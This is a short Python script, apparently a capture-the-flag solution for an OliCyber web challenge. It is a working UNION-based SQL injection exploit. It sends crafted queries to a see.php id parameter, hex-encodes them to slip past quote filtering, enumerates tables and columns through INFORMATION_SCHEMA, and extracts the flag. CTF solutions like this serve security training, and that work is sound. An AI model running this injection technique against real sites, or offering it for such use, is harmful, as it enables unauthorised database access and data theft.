import requests as r
from bs4 import BeautifulSoup as bs

url = 'http://inception.challs.olicyber.it/'

queries = [
    "200 union select TABLE_NAME as decription from INFORMATION_SCHEMA.TABLES",
    "200 union select COLUMN_NAME as decription from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME = '{}'",
    "200 union select {} as decription from {}"
]


def exec_inj(query):
    # https://nets.ec/SQL_injection#Quotes
    query = '0x' + query.encode('utf-8').hex()
    id = 'ox' + 'id'.encode('utf-8').hex()

    inj = "200 union select "+query+" as "+id+", TABLE_NAME, TABLE_NAME from INFORMATION_SCHEMA.TABLES"
    # as id diventa upper
    ret = r.get(url + 'see.php?id=' + inj).text
    soup = bs(ret, 'html.parser')
    # value is in the last p tag
    return soup.find_all('p')[-1].text


table = exec_inj(queries[0])
column = exec_inj(queries[1].format(table))
flag = exec_inj(queries[2].format(column, table))
print(flag)